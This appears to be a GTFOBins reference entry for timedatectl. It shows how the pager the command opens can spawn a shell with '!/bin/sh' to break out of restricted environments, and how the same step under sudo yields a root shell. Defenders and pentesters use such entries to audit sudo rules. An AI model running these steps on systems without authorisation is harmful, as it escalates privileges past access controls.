# GTFOBin: timedatectl

This invokes the default pager, which is likely to be `less`, other functions may apply.

This might not work if run by unprivileged users depending on the system configuration.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
timedatectl list-timezones
!/bin/sh
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo timedatectl list-timezones
!/bin/sh
```